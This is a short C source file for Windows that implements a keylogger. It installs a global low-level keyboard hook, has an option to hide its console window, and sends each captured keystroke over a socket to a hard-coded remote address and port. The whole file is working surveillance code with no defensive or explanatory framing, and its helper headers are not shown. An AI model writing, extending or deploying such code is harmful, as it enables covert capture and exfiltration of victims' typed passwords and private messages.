#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "socket.h"
#include "keys.h"

#define SHOW_WINDOW TRUE

#define IP "192.168.1.100"
#define PORT 5175

HHOOK hook;
LRESULT __stdcall keyuse(int nCode, WPARAM wParam, LPARAM lParam);
char buffer[1000];
SOCKET sock;

int main(int argc, char *argv[]) {
	HANDLE cons;
	int err = 0;
	cons = GetConsoleWindow();
	sock = newSocket(&err, IP, PORT, AS_CLIENT);
	if (err != 0) {
		printf("Error: %d\n", err);
		exit(1);
	}
	puts("Connected!");
	if (!SHOW_WINDOW) {
		ShowWindow(cons, FALSE);
	}
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyuse, NULL, 0);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) != 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	if (hook) {
		UnhookWindowsHookEx(hook);
	}
	return 0;
}

LRESULT __stdcall keyuse(int nCode, WPARAM wParam, LPARAM lParam) {
	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION) {
		memset(buffer, 0, sizeof(buffer));
		processKey(key->vkCode, buffer);
		sendData(sock, buffer);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
